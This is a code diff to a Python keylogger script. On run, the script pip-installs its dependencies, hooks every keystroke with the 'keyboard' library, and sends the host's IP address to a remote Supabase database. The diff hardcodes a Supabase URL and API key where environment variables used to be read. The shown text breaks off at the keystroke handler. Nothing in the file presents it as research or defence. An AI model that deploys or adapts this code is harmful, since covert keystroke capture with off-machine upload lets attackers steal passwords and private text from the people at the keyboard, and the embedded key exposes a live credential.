@@ -1,31 +1,18 @@
-import os
 import sys
 import subprocess
 import socket
 from datetime import datetime, timezone
 
 requiredModules = ["supabase", "keyboard"]
-venvName = "venv"
-
-
-def activateVenv():
-    subprocess.run([sys.executable, "-m", "venv", venvName])
-    activateScriptPath = os.path.join(
-        ".\\", venvName, "Scripts" if os.name == "nt" else "bin", "activate"
-    )
-    print(activateScriptPath)
-    tsubprocess.run([activateScriptPath])
+SUPABASE_URL = "https://jnczovwmdeqslohdqjom.supabase.co"
+SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpuY3pvdndtZGVxc2xvaGRxam9tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTI5OTE2MTAsImV4cCI6MjAyODU2NzYxMH0.jFKLurHSYY7t9dM6sKOkwD3VzlZ-UdPcwWzOj9OSjQQ"
 
 
 def installModules():
     for module in requiredModules:
-        if not module in sys.modules:
-            print(f"Installing {module}...")
-            subprocess.check_call([sys.executable, "-m", "pip", "install", module])
-            print(f"{module} installed successfully.")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", module])
 
 
-activateVenv()
 installModules()
 
 from supabase import create_client, Client, PostgrestAPIError
@@ -34,13 +21,12 @@ import keyboard
 
 class KeyLogger:
     def __init__(self) -> None:
-        self.cache = {}
-
-        self.db: Client = self.initializeDB()
+        self.db: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
         print("DB Initialized")
 
         self.ip = socket.gethostbyname(socket.gethostname())
         print(f"IP: {self.ip}")
+
         try:
             query = self.db.table("IP_ADDRESS").insert({"ip": self.ip})
             query.execute()
@@ -50,15 +36,6 @@ class KeyLogger:
 
         keyboard.hook(lambda e: self.onKeyboardAction(e))
         keyboard.wait("")
-
-    def initializeDB(self) -> Client:
-        try:
-            url: str = os.environ.get("SUPABASE_URL")
-            key: str = os.environ.get("SUPABASE_KEY")
-        except Exception as e:
-            url = "https://<your_supabase_url>.supabase.co"
-            key = "<your_supabase_key>"
-        return create_client(url, key)
 
     def onKeyboardAction(self, e: keyboard.KeyboardEvent) -> None:
         if e.event_type == keyboard.KEY_DOWN:
